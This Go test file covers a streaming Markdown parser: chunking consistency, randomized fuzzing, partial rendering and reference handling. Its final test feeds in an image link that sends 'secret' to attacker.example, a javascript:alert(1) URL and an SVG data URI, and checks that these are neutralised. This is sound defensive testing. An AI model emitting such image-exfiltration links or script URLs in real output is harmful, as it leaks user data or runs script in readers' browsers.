// Copyright 2026 doors dev LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package parser

import (
	"bytes"
	_ "embed"
	"encoding/json"
	"fmt"
	"math/rand"
	"slices"
	"strings"
	"testing"

	"github.com/yuin/goldmark"
	"github.com/yuin/goldmark/extension"
	gmparser "github.com/yuin/goldmark/parser"
	"github.com/yuin/goldmark/renderer/html"
	"github.com/yuin/goldmark/text"
	"neui.dev/internal/markdown"
)

//go:embed testdata/examples.json
var examplesJSON []byte

type example struct {
	Section  string `json:"section"`
	Example  int    `json:"example"`
	Markdown string `json:"markdown"`
	Src      string `json:"src"`
}

var unsafeMarkdown = goldmark.New(
	goldmark.WithExtensions(extension.GFM),
	goldmark.WithRendererOptions(html.WithUnsafe()),
)

func render(t *testing.T, source string, references []gmparser.Reference) string {
	context := gmparser.NewContext()
	for _, reference := range references {
		context.AddReference(reference)
	}
	var buf bytes.Buffer
	if err := unsafeMarkdown.Convert([]byte(source), &buf, gmparser.WithContext(context)); err != nil {
		t.Fatal(err)
	}
	return buf.String()
}

func references(source string) []gmparser.Reference {
	context := gmparser.NewContext()
	unsafeMarkdown.Parser().Parse(text.NewReader([]byte(source)), gmparser.WithContext(context))
	return context.References()
}

func split(source string, step int) (blocks []string) {
	s := newStreamer(func(block []byte) { blocks = append(blocks, string(block)) })
	for i := 0; i < len(source); i += step {
		s.Write(source[i:min(i+step, len(source))])
	}
	s.Close()
	return blocks
}

func TestSpecExamples(t *testing.T) {
	var examples []example
	if err := json.Unmarshal(examplesJSON, &examples); err != nil {
		t.Fatal(err)
	}
	for _, e := range examples {
		t.Run(fmt.Sprintf("%s/%d", e.Src, e.Example), func(t *testing.T) {
			blocks := split(e.Markdown, len(e.Markdown)+1)
			if bytewise := split(e.Markdown, 1); !slices.Equal(blocks, bytewise) {
				t.Fatalf("chunking changes blocks\n whole: %q\n bytes: %q", blocks, bytewise)
			}
			definitions := references(e.Markdown)
			var got strings.Builder
			for _, block := range blocks {
				got.WriteString(render(t, block, definitions))
			}
			if want := render(t, e.Markdown, nil); got.String() != want {
				t.Errorf("[%s]\n%q\nblocks: %q\nwant: %s\ngot:  %s", e.Section, e.Markdown, blocks, want, got.String())
			}
		})
	}
	t.Logf("%d examples", len(examples))
}

func TestRandomDocuments(t *testing.T) {
	tokens := []string{"", "", "foo", "bar baz", "# h", "## h2", "```", "~~~", "    code", "\tcode", "> ", "> > ", "- ", "* ", "+ ", "1. ", "2) ", "  ", "   ", "    ", "---", "***", "===", "- - -", "-", ">", "  - ", "  > ", "     x", "1.", "10)  ", "  ```", "  ---", "foo  ", "  *", "-   ", "1) ", "| a |", "|---|", "a | b", "-|-", "| - |", "  | x |", "\\|", "|", "<div>", "</div>", "<!--", "-->", "<span>", "<pre>", "</pre>"}
	r := rand.New(rand.NewSource(1))
	for i := 0; i < 20000; i++ {
		var doc strings.Builder
		lines := 1 + r.Intn(12)
		for l := 0; l < lines; l++ {
			for k := 1 + r.Intn(3); k > 0; k-- {
				doc.WriteString(tokens[r.Intn(len(tokens))])
			}
			if r.Intn(10) != 0 || l < lines-1 {
				doc.WriteString("\n")
			}
		}
		source := doc.String()
		func() {
			defer func() {
				if e := recover(); e != nil {
					t.Fatalf("panic %v on %q", e, source)
				}
			}()
			blocks := split(source, len(source)+1)
			for _, step := range []int{1, 3} {
				if other := split(source, step); !slices.Equal(blocks, other) {
					t.Fatalf("chunking by %d changes blocks on %q\n whole: %q\n step:  %q", step, source, blocks, other)
				}
			}
			joined := strings.Join(blocks, "")
			pos := 0
			for _, line := range strings.Split(source, "\n") {
				if isBlank(line) {
					continue
				}
				k := strings.Index(joined[pos:], line+"\n")
				if k < 0 {
					t.Fatalf("line %q lost or reordered on %q -> %q", line, source, blocks)
				}
				pos += k + len(line) + 1
			}
		}()
	}
}

func TestPartial(t *testing.T) {
	var blocks []string
	s := New(func(block []byte) { blocks = append(blocks, string(block)) })
	check := func(want string, ok bool) {
		t.Helper()
		got, gotOK := s.Partial()
		if string(got) != want || gotOK != ok {
			t.Fatalf("Partial() = %q, %v; want %q, %v", got, gotOK, want, ok)
		}
	}
	table := "<table>\n<thead>\n<tr>\n<th>a</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>row</td>\n</tr>\n</tbody>\n</table>\n"
	check("", false)
	s.Write("para\nmo")
	check("<p>para\nmo</p>\n", true)
	s.Write("re\n\n")
	check("", false)
	s.Write("| a |\n")
	check("<p>| a |</p>\n", true)
	s.Write("|---|\nrow")
	check(table, true)
	s.Close()
	check("", false)
	if want := []string{"<p>para\nmore</p>\n", table}; !slices.Equal(blocks, want) {
		t.Fatalf("blocks %q, want %q", blocks, want)
	}
}

func TestHTML(t *testing.T) {
	var examples []example
	if err := json.Unmarshal(examplesJSON, &examples); err != nil {
		t.Fatal(err)
	}
	compared, skipped := 0, 0
	for _, e := range examples {
		if len(references(e.Markdown)) != 0 {
			skipped++
			continue
		}
		compared++
		t.Run(fmt.Sprintf("%s/%d", e.Src, e.Example), func(t *testing.T) {
			var got strings.Builder
			s := New(func(block []byte) { got.Write(block) })
			s.Write(e.Markdown)
			s.Close()
			var want bytes.Buffer
			if err := markdown.Convert([]byte(e.Markdown), &want); err != nil {
				t.Fatal(err)
			}
			if got.String() != want.String() {
				t.Errorf("[%s]\n%q\nwant: %s\ngot:  %s", e.Section, e.Markdown, want.String(), got.String())
			}
		})
	}
	t.Logf("%d compared, %d skipped", compared, skipped)
}

func TestReferencesCarryOver(t *testing.T) {
	for _, c := range []struct{ source, want string }{
		{"[foo]: /url\n\n[foo]\n", "<p><a href=\"/url\">foo</a></p>\n"},
		{"[foo]\n\n[foo]: /url\n", "<p>[foo]</p>\n"},
	} {
		var got strings.Builder
		s := New(func(block []byte) { got.Write(block) })
		s.Write(c.source)
		s.Close()
		if got.String() != c.want {
			t.Errorf("%q: got %q, want %q", c.source, got.String(), c.want)
		}
	}
}

func TestOnlyLocalImagesRender(t *testing.T) {
	for _, c := range []struct{ source, want string }{
		{"![pic](file:///user_uploads/a.png)\n", "<p><img src=\"file:///user_uploads/a.png\" alt=\"pic\"></p>\n"},
		{"![dot](data:image/png;base64,AAAA)\n", "<p><img src=\"data:image/png;base64,AAAA\" alt=\"dot\"></p>\n"},
		{"![x](https://attacker.example/x?d=secret)\n", "<p><a href=\"https://attacker.example/x?d=secret\">x</a></p>\n"},
		{"![*bold* x](https://a.example/p.png \"t\")\n", "<p><a href=\"https://a.example/p.png\" title=\"t\"><em>bold</em> x</a></p>\n"},
		{"![](https://a.example/p.png)\n", "<p><a href=\"https://a.example/p.png\">https://a.example/p.png</a></p>\n"},
		{"![svg](data:image/svg+xml;base64,AAAA)\n", "<p><a href=\"\">svg</a></p>\n"},
		{"![js](javascript:alert(1))\n", "<p><a href=\"\">js</a></p>\n"},
	} {
		var got strings.Builder
		s := New(func(block []byte) { got.Write(block) })
		s.Write(c.source)
		s.Close()
		if got.String() != c.want {
			t.Errorf("%q: got %q, want %q", c.source, got.String(), c.want)
		}
	}
}
